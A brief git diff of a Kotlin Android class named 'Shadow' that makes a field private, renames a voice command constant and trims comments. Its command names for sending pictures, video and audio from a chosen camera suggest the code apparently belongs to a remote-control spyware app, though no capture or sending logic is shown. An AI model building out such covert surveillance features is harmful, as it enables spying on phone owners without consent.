@@ -23,7 +23,7 @@ import java.io.File
  */
 
 class Shadow(context: Context) : Command(), Executor {
-    val mContext = context
+    private val mContext = context
 
     companion object {
         const val SEND_SHADOW = "send_shadow"
@@ -31,16 +31,13 @@ class Shadow(context: Context) : Command(), Executor {
 
         const val SEND_PIC = "send_pic"
         const val SEND_VIDEO = "send_video"
-        const val SEND_VOICE = "send_voice"
+        const val SEND_VOICE = "send_audio"
     }
 
     /**
      * @data is the command rule
      * data[0] is  the command type between SEND_PIC     OR     SEND_VIDEO
      * data[1] is the camera type between CAMERA_FRONT = "1"    or    CAMERA_BACK = "0"
-     *
-     *
-     *
      */
     override fun execute(data: Array<Any>) {
 
